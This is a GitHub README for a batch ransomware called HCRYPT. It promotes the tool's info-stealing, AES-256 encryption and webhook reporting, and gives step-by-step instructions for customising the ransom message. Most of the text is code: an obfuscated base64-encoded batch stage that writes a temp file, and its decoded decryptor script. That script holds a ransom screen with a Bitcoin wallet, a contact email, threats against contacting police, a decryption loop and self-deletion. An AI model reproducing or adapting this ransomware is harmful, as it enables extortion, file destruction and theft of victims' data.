# HCRYPT-Ransomware



![s](https://github.com/Ghost-crypto-exe/HCRYPT-Ransomware/assets/72792767/d30e6e25-e18d-48b5-8b6f-a60d16f6ae6c)




A somewhat advanced batch ransomware with built in info stealer, aes256 encryption and other cool features like sending all info to a webhook...


Below you can find steps to make the ransomware your own.


[STEP 1]

Inorder to make the file opperational navigate to the downloaded .bat file, open it in notepad or any other text editor. Once open scroll down to the following part in the text and follow the instructions:


![Unbenannt](https://github.com/Ghost-crypto-exe/HCRYPT-Ransomware/assets/72792767/403dedf1-33d4-486e-8573-5d1d17b1da6c)

Inorder to change the decryptor message navigate to line 15745 and base64 decode the following:

[STEP 2]

```
echo QGVjaG8gb2ZmDQpmb3IgL2YgImRlbGltcz1bXSB0b2tlbnM9MiIgJSVhIGluICgn > Do_Not_Delete.tmp & %mtrcpjq%%bjpsfhg%%bjpsfhg%%bhhemjc%%amtbrob%%ztrcpjq%%xtrcpjq%%lmkobld%%btrcpjq%%xtrcpjq%%lmkobld%%algqwon%%xtrcpjq%Do_Not_Delete.tmp
echo Ml4+TlVMIHBpbmcgLTQgLW4gMSAlQ29tcHV0ZXJOYW1lJSBefCBmaW5kc3RyIFsn >> Do_Not_Delete.tmp
echo KSBkbyBzZXQgTmV0d29ya0lQPSUlYQ0KZm9yIC9mICJ0b2tlbnM9MS00IGRlbGlt >> Do_Not_Delete.tmp
echo cz0vOi4iICUlYSBpbiAoIiVUSU1FJSIpIGRvICgNCglzZXQgSEgyND0lJWENCglz >> Do_Not_Delete.tmp
echo ZXQgTUk9JSViDQopDQoNCjpWQlNEeW5hbWljQnVpbGQNClNFVCBUZW1wVkJTRmls >> Do_Not_Delete.tmp
echo ZT0ldGVtcCVcfnRtcFNlbmRLZXlzVGVtcC52YnMNCklGIEVYSVNUICIlVGVtcFZC >> Do_Not_Delete.tmp
echo U0ZpbGUlIiBERUwgL0YgL1EgIiVUZW1wVkJTRmlsZSUiDQpFQ0hPIFNldCBXc2hT >> Do_Not_Delete.tmp
echo aGVsbCA9IFdTY3JpcHQuQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikgPj4i >> Do_Not_Delete.tmp
echo JVRlbXBWQlNGaWxlJSINCkVDSE8gV3NjcmlwdC5TbGVlcCAxICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgPj4iJVRlbXBWQlNGaWxlJSINCkVDSE8g >> Do_Not_Delete.tmp
echo V3NoU2hlbGwuU2VuZEtleXMgIntGMTF9IiAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICA+PiIlVGVtcFZCU0ZpbGUlDQpFQ0hPIFdzY3JpcHQuU2xlZXAgMSAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgID4+IiVUZW1wVkJTRmlsZSUi >> Do_Not_Delete.tmp
echo DQoNCkNTQ1JJUFQgLy9ub2xvZ28gIiVUZW1wVkJTRmlsZSUiDQoNCmdvdG8gOmZs >> Do_Not_Delete.tmp
echo anNmZ2tuanNnbg0KOmV4aXQNCmV4aXQNCjpmbGpzZmdrbmpzZ24NCjptYWluDQpj >> Do_Not_Delete.tmp
echo bHMNCm1vZGUgY29uIGNvbHM9MTUwIGxpbmVzPTUwDQplY2hvLg0KZWNoby4NCmVj >> Do_Not_Delete.tmp
echo aG8uDQplY2hvICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4u >> Do_Not_Delete.tmp
echo Li4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4N >> Do_Not_Delete.tmp
echo CmVjaG8gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAu >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQVRURU5U >> Do_Not_Delete.tmp
echo SU9OICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLg0KZWNo >> Do_Not_Delete.tmp
echo byAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC4gICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuDQplY2hvICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLiAgICAgQWxs >> Do_Not_Delete.tmp
echo IG9yIHNvbWUgb2YgeW91ciBmaWxlcyBoYXZlIGJlZW4gZW5jcnlwdGVkIGJ5IHRo >> Do_Not_Delete.tmp
echo ZSBIQ1JZUFQgcmFuc29td2FyZSB5b3Ugbm93ICAgICAgIC4NCmVjaG8gICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo aGF2ZSB0byBwYXkgdGhlIHN1bSBvZiAwLjAwMzYgQlRDIHRvIHJlZ2FpbiBhY2Nl >> Do_Not_Delete.tmp
echo c3MgdG8geW91ciBmaWxlcyEgICAgICAgICAgICAgLg0KZWNobyAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgbycnJ28gICAgICAgIC4gICAgIFBsZWFzZSByZWFk >> Do_Not_Delete.tmp
echo IHRoaXMgdmVyeSBjYXJlZnVsbHkgYW5kIGZvbGxvdyBvdXIgaW5zdHJ1Y3Rpb25z >> Do_Not_Delete.tmp
echo IGVsc2UgeW91ciBmaWxlcyBhcmUgICAgICAuICAgICAgICBvJycnbw0KZWNobyAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgIG8gICAgICAgbyAgICAgIC4gICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgZ29uZSBmb3JldmVyIGFuZCBjYW4ndCBiZSBy >> Do_Not_Delete.tmp
echo ZXN0b3JlZC4gICAgICAgICAgICAgICAgICAgICAgICAgICAuICAgICAgbyAgICAg >> Do_Not_Delete.tmp
echo ICBvDQplY2hvICAgICAgICAgICAgICAgICAgICAgICAgICAgbyAgICAgICBvICAg >> Do_Not_Delete.tmp
echo ICAgLiAgICAgSWYgeW91IHJlcG9ydCB0aGlzIHRvIHRoZSBwb2xpY2Ugb3IgYW55 >> Do_Not_Delete.tmp
echo IGN5YmVyc2VjdXJpdHkgY29tcGFueXMgd2Ugd2lsbCBzZWUgdGhpcyAgICAgIC4g >> Do_Not_Delete.tmp
echo ICAgICBvICAgICAgIG8NCmVjaG8gICAgICAgICAgICAgICAgICAgICAgICAgIG9v >> Do_Not_Delete.tmp
echo b29vb29vb29vICAgICAuICAgICAgICAgICAgICAgICAgIGFzIGhvc3RpbGUgaW50 >> Do_Not_Delete.tmp
echo ZW5kIGFuZCBpbW1lZGlhdGVseSBkZWxldGUgeW91ciBmaWxlcy4gICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgLiAgICAgb29vb29vb29vb28NCmVjaG8gICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgIG9vb28gTyBvb29vICAgICAuICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgLiAgICAgb29vbyBPIG9vb28NCmVjaG8gICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgIG9vb28gVSBvb29vICAgICAuLi4uLi4uLi4u >> Do_Not_Delete.tmp
echo Li4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4u >> Do_Not_Delete.tmp
echo Li4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLiAgICAgb29vbyBVIG9v >> Do_Not_Delete.tmp
echo b28NCmVjaG8gICAgICAgICAgICAgICAgICAgICAgICAgIG9vb29vb29vb29vICAg >> Do_Not_Delete.tmp
echo ICAuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIElOU1RS >> Do_Not_Delete.tmp
echo VUNUSU9OUyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLiAg >> Do_Not_Delete.tmp
echo ICAgb29vb29vb29vb28NCmVjaG8gICAgICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgLg0KZWNobyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgIC4gICAgIDEuIC8vIFBsZWFzZSB0YWtlIHlvdXIgcGhvbmUgYW5k >> Do_Not_Delete.tmp
echo IG9wZW4geW91ciBicm93c2VyLCBvbmNlIGRvbmUgcGxlYXNlIGNyZWF0ZSBhICAg >> Do_Not_Delete.tmp
echo ICAgICAuDQplY2hvICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgLiAgICAgICAgICAgYml0Y29pbiB3YWxsZXQgKG1vcmUgaW5mbyBhdCBo >> Do_Not_Delete.tmp
echo dHRwczovL2JpdGNvaW4uaW5mby9mYXEpIGFuZCBtb3ZlIG9uIHRvICAgICAgICAg >> Do_Not_Delete.tmp
echo IC4NCmVjaG8gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAuICAgICAgICAgICBzdGVwIDIuICAgICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLg0K >> Do_Not_Delete.tmp
echo ZWNobyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC4g >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuDQplY2hv >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLiAgICAg >> Do_Not_Delete.tmp
echo Mi4gLy8gUGxlYXNlIHNlbmQgdGhlIGdpdmVuIGFtb3VudCBvZiAwLjAwMzYgQlRD >> Do_Not_Delete.tmp
echo IHRvIHRoZSBmb2xsb3dpbmcgQml0Y29pbiAgICAgICAgICAgIC4NCmVjaG8gICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuICAgICAgICAg >> Do_Not_Delete.tmp
echo ICB3YWxsZXQgOiAzSmdmU0dzN1J3YXVGeWF3YjkyVktSWUxYcEhHb3hSeU5iICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLg0KZWNobyAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC4gICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuDQplY2hvICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLiAgICAgMy4gLy8gT25jZSB5 >> Do_Not_Delete.tmp
echo b3Ugc3VjY2VzZnVsbHkgc2VudCB0aGUgcmlnaHQgYW1vdW50IG9mIGJpdGNvaW4g >> Do_Not_Delete.tmp
echo dG8gdGhlIGFib3RoICAgICAgICAgICAgIC4NCmVjaG8gICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAuICAgICAgICAgICB3YWxsZXQgcGxl >> Do_Not_Delete.tmp
echo YXNlIHRha2UgYSBzY3JlZW5zaG90IG9mIHlvdXIgcGF5bWVudCB3aXRoIGEgdGlt >> Do_Not_Delete.tmp
echo ZSBzdGFtcCBhbmQgICAgICAgICAgLg0KZWNobyAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgIC4gICAgICAgICAgIHNlbmQgaXQgdG8gdGhl >> Do_Not_Delete.tmp
echo IGZvbGxvd2luZyBlbWFpbCB3aXRoIHlvdXIgSUQgYXR0YWNoZWQgKElEIGNhbiBi >> Do_Not_Delete.tmp
echo ZSBmb3VuZCAgICAgICAgICAuDQplY2hvICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgLiAgICAgICAgICAgb24geW91ciBkZXNrdG9wIG9y >> Do_Not_Delete.tmp
echo IGNsaXBib2FyZCkuICAgRW1haWw6IENyeW9HZW5FNEBwcm90b25tYWlsLmNvbSAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgIC4NCmVjaG8gICAgICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgLg0KZWNobyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgIC4gICAgIDQuIC8vIEFmdGVyIHlvdSBoYXZlIGNvbXBsZXRlZCB0 >> Do_Not_Delete.tmp
echo aGUgZmlyc3QgdHdvIHN0ZXBzIHlvdSBoYXZlIHRvIHdhaXQgYXRsZWFzdCAgICAg >> Do_Not_Delete.tmp
echo ICAgICAuDQplY2hvICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgLiAgICAgICAgICAgb25lIGhvdXIgZm9yIHVzIHRvIHByb2Nlc3MgeW91 >> Do_Not_Delete.tmp
echo ciBwdXJjaGFzZSAobWF4LiAyNCBob3VycykuIE9uY2Ugd2UgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo IC4NCmVjaG8gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAuICAgICAgICAgICB2ZXJpZmllZCB5b3VyIHB1cmNoYXNlIHdlIHdpbGwgc2Vu >> Do_Not_Delete.tmp
echo ZCB5b3UgdGhlIGRlY3J5cHRpb24ga2V5IGZvciB5b3VyIFBDLiAgICAgICAgLg0K >> Do_Not_Delete.tmp
echo ZWNobyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC4g >> Do_Not_Delete.tmp
echo ICAgICAgICAgIEFmdGVyIHlvdSBoYXZlIHJlY2VpdmVkIHRoZSBrZXkgcGxlYXNl >> Do_Not_Delete.tmp
echo IGVudGVyIGl0IGJlbG93LiAgICAgICAgICAgICAgICAgICAgICAgICAuDQplY2hv >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLiAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC4NCmVjaG8gICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFTkpPWSA6KSAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLg0KZWNobyAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC4gICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuDQplY2hvICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLiAgICAgICAgICAgICBZT1Ug >> Do_Not_Delete.tmp
echo SEFWRSAxIERBWSBMRUZUIFRPIFBBWSBPUiBBTEwgWU9VUiBGSUxFUyBXSUxMIFNU >> Do_Not_Delete.tmp
echo QVkgRU5DUllQVEVEICAgICAgICAgICAgIC4NCmVjaG8gICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAuICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgLg0KZWNobyAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgIC4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4u >> Do_Not_Delete.tmp
echo Li4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4u >> Do_Not_Delete.tmp
echo Li4uLi4uLi4uLi4uLi4uLi4uDQplY2hvICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgIElORk8NCmVjaG8uDQplY2hvICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZJTEUgVFlQRVMgRU5DUllQ >> Do_Not_Delete.tmp
echo VEVEOiB0eHQsIG1wMywganBnLCBtcDQsICAgICAgICBVU0VSTkFNRTogJXVzZXJu >> Do_Not_Delete.tmp
echo YW1lJQ0KZWNobyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2lmLCBwbmcsIGRvYywg >> Do_Not_Delete.tmp
echo emlwLCAgICAgICAgVElNRTogJXRpbWUlDQplY2hvICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICBwcHR4LCBqcGVnLCBkb2N4LC4uLiAgICAgICBEQVRFOiAlZGF0ZSUNCmVj >> Do_Not_Delete.tmp
echo aG8uDQplY2hvICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRvIGxlYXZlIHRoaXMg >> Do_Not_Delete.tmp
echo cHJvZ3JhbSB0eXBlICdFeGl0JyAgDQplY2hvLg0KZWNobyAgICAgICAgICAgICAg >> Do_Not_Delete.tmp
echo ICAgICAgICAgICAgICAgICAgICAgICAgICAgIC4uLi4uLi4uLi4uLi4uLi4uLi4u >> Do_Not_Delete.tmp
echo Li4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4u >> Do_Not_Delete.tmp
echo Li4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uDQplY2hvLg0KZWNoby4NCnNldCAvcCAi >> Do_Not_Delete.tmp
echo cGFzcz1bIFBhc3N3b3JkIF06Ig0KaWYgJXBhc3MlPT1FWElUIGdvdG8gOmV4aXQN >> Do_Not_Delete.tmp
echo CmlmICVwYXNzJT09RXhpdCBnb3RvIDpleGl0DQppZiAlcGFzcyU9PWV4aXQgZ290 >> Do_Not_Delete.tmp
echo byA6ZXhpdA0Kc2V0IGNkbm93PSVjZCUNCnNldCBkZWNyeXB0X3BhdGg9JXVzZXJw >> Do_Not_Delete.tmp
echo cm9maWxlJQ0Kc2V0IGI9MA0KaWYgZXhpc3QgIiVjZG5vdyVcZGVjcnlwdF9tZS50 >> Do_Not_Delete.tmp
echo eHQiIGRlbCAiJWNkbm93JVxkZWNyeXB0X21lLnR4dCINCmNkICVkZWNyeXB0X3Bh >> Do_Not_Delete.tmp
echo dGglDQpjYWxsIDpzZWFyY2gNCmlmICViJT09MCB0aW1lb3V0IDMgL25vYnJlYWsg >> Do_Not_Delete.tmp
echo Pm51bCAmIGV4aXQNCmVjaG8gZmlsZXM6JWIlPj4iJWNkbm93JS9kZWNyeXB0X21l >> Do_Not_Delete.tmp
echo LnR4dCINCjpkZWNyeXB0DQpzZXQgYz0wDQpjZCAiJWNkbm93JSINCjpkZWNyeXB0 >> Do_Not_Delete.tmp
echo X2xvb3ANCnNldCAvYSBjPSVjJSsxDQpmb3IgL2YgInRva2Vucz0xKiBkZWxpbXM9 >> Do_Not_Delete.tmp
echo OiIgJSVpIGluICgnZmluZHN0ciAvYiAiJWMlOiIgIiVjZG5vdyVcZGVjcnlwdF9t >> Do_Not_Delete.tmp
echo ZS50eHQiJykgZG8gc2V0ICJmaWxlX25vdz0lJWoiDQplY2hvIFslYyUvJWIlXSBE >> Do_Not_Delete.tmp
echo ZWNyeXB0aW5nOiAlZmlsZV9ub3clDQpTeXN0ZW0uZXhlIC0tZGVjcnlwdCAtLWZp >> Do_Not_Delete.tmp
echo bGU9JWZpbGVfbm93JSAtLXBhc3M9JXBhc3MlDQppZiAlZXJyb3JsZXZlbCU9PTEg >> Do_Not_Delete.tmp
echo Y2xzICYgZWNobyBXcm9uZyBQYXNzd29yZCEgJiBjb2xvciBjICYgdGltZW91dCA1 >> Do_Not_Delete.tmp
echo IC9ub2JyZWFrID5udWwgJiBnb3RvIDptYWluDQppZiAlYyU9PSViJSBnb3RvIGRl >> Do_Not_Delete.tmp
echo bGV0ZV9hbGwNCmdvdG8gZGVjcnlwdF9sb29wDQo6ZGVsZXRlX2FsbA0KZGVsIC9T >> Do_Not_Delete.tmp
echo ICIlZGVjcnlwdF9wYXRoJVwqLmRhdGEuaGNyeXB0IiA+TlVMDQpkZWwgL1MgIiVk >> Do_Not_Delete.tmp
echo ZWNyeXB0X3BhdGglXCouaGVhZC5oY3J5cHQiID5OVUwNCmNscw0KY29sb3IgYQ0K >> Do_Not_Delete.tmp
echo ZWNobyBTdWNjZXNzIQ0KdGltZW91dCA0IC9ub2JyZWFrID5udWwNCmV4aXQNCjpz >> Do_Not_Delete.tmp
echo ZWFyY2gNCmZvciAvZiAiZGVsaW1zPSIgJSVhIElOICgnZGlyIC9iIC9zICouZGF0 >> Do_Not_Delete.tmp
echo YS5oY3J5cHQnKSBkbyBzZXQgYT0iJSVhIiAmIGNhbGwgOnNlYXJjaDEgJSVhDQpn >> Do_Not_Delete.tmp
echo b3RvIGVuZA0KOnNlYXJjaDENCnNldCAvYSBiPSViJSsxDQplY2hvICViJTolYSU+ >> Do_Not_Delete.tmp
echo PiIlY2Rub3clL2RlY3J5cHRfbWUudHh0Ig0KZWNobyBbJWIlXSBGb3VuZDogJWEl >> Do_Not_Delete.tmp
echo DQpnb3RvIDplb2YNCjplbmQ= >> Do_Not_Delete.tmp
```

once decoded you will see the following:

[STEP 3]

```
@echo off
for /f "delims=[] tokens=2" %%a in ('2^>NUL ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
for /f "tokens=1-4 delims=/:." %%a in ("%TIME%") do (
	set HH24=%%a
	set MI=%%b
)

:VBSDynamicBuild
SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
ECHO Wscript.Sleep 1                                    >>"%TempVBSFile%"
ECHO WshShell.SendKeys "{F11}"                            >>"%TempVBSFile%
ECHO Wscript.Sleep 1                                    >>"%TempVBSFile%"

CSCRIPT //nologo "%TempVBSFile%"

goto :fljsfgknjsgn
:exit
exit
:fljsfgknjsgn
:main
cls
mode con cols=150 lines=50
echo.
echo.
echo.
echo                                          ............................................................................................
echo                                          .                                          ATTENTION                                       .
echo                                          .                                                                                          .
echo                                          .     All or some of your files have been encrypted by the HCRYPT ransomware you now       .
echo                                          .            have to pay the sum of 0.0036 BTC to regain access to your files!             .
echo                             o'''o        .     Please read this very carefully and follow our instructions else your files are      .        o'''o
echo                           o       o      .                            gone forever and can't be restored.                           .      o       o
echo                           o       o      .     If you report this to the police or any cybersecurity companys we will see this      .      o       o
echo                          ooooooooooo     .                   as hostile intend and immediately delete your files.                   .     ooooooooooo
echo                          oooo O oooo     .                                                                                          .     oooo O oooo
echo                          oooo U oooo     ............................................................................................     oooo U oooo
echo                          ooooooooooo     .                                        INSTRUCTIONS                                      .     ooooooooooo
echo                                          .                                                                                          .
echo                                          .     1. // Please take your phone and open your browser, once done please create a        .
echo                                          .           bitcoin wallet (more info at https://bitcoin.info/faq) and move on to          .
echo                                          .           step 2.                                                                        .
echo                                          .                                                                                          .
echo                                          .     2. // Please send the given amount of 0.0036 BTC to the following Bitcoin            .
echo                                          .           wallet : 3JxUSGs7RwauFyawboPVKRYLXpHLPxRyNb                                    .
echo                                          .                                                                                          .
echo                                          .     3. // Once you succesfully sent the right amount of bitcoin to the aboth             .
echo                                          .           wallet please take a screenshot of your payment with a time stamp and          .
echo                                          .           send it to the following email with your ID attached (ID can be found          .
echo                                          .           on your desktop or clipboard).   Email: CryoGenE4@protonmail.com               .
echo                                          .                                                                                          .
echo                                          .     4. // After you have completed the first two steps you have to wait atleast          .
echo                                          .           one hour for us to process your purchase (max. 24 hours). Once we              .
echo                                          .           verified your purchase we will send you the decryption key for your PC.        .
echo                                          .           After you have received the key please enter it below.                         .
echo                                          .                                                                                          .
echo                                          .                                         ENJOY :)                                         .
echo                                          .                                                                                          .
echo                                          .             YOU HAVE 1 DAY LEFT TO PAY OR ALL YOUR FILES WILL STAY ENCRYPTED             .
echo                                          .                                                                                          .
echo                                          ............................................................................................
echo                                                                                     INFO
echo.
echo                                                 FILE TYPES ENCRYPTED: txt, mp3, jpg, mp4,        USERNAME: %username%
echo                                                                       gif, png, doc, zip,        TIME: %time%
echo                                                                       pptx, jpeg, docx,...       DATE: %date%
echo.
echo                                                                         To leave this program type 'Exit'  
echo.
echo                                          ............................................................................................
echo.
echo.
set /p "pass=[ Password ]:"
if %pass%==EXIT goto :exit
if %pass%==Exit goto :exit
if %pass%==exit goto :exit
set cdnow=%cd%
set decrypt_path=%userprofile%
set b=0
if exist "%cdnow%\decrypt_me.txt" del "%cdnow%\decrypt_me.txt"
cd %decrypt_path%
call :search
if %b%==0 timeout 3 /nobreak >nul & exit
echo files:%b%>>"%cdnow%/decrypt_me.txt" & attrib +h +s "%cdnow%/decrypt_me.txt"
:decrypt
set c=0
cd "%cdnow%"
:decrypt_loop
set /a c=%c%+1
for /f "tokens=1* delims=:" %%i in ('findstr /b "%c%:" "%cdnow%\decrypt_me.txt"') do set "file_now=%%j"
echo [%c%/%b%] Decrypting: %file_now%
System.exe --decrypt --file=%file_now% --pass=%pass%
if %errorlevel%==1 cls & echo Wrong Password! & color c & timeout 5 /nobreak >nul & goto :main
if %c%==%b% goto delete_all
goto decrypt_loop
:delete_all
del /S "%decrypt_path%\*.data.hcrypt" >NUL
del /S "%decrypt_path%\*.head.hcrypt" >NUL
attrib -h -s "%cdnow%/decrypt_me.txt"
del /q /f "%cdnow%/decrypt_me.txt"
attrib -h -s System.exe
del /q /f System.exe
del /q /f %0
exit
:search
for /f "delims=" %%a IN ('dir /b /s *.data.hcrypt') do set a="%%a" & call :search1 %%a
goto end
:search1
set /a b=%b%+1
echo %b%:%a%>>"%cdnow%/decrypt_me.txt"
echo [%b%] Found: %a%
goto :eof
:end
```
Now replace the message with your own... Base 64 encode it again and add it back into the code from step 1.

(Currently only tested in windows 10 2022 Server)

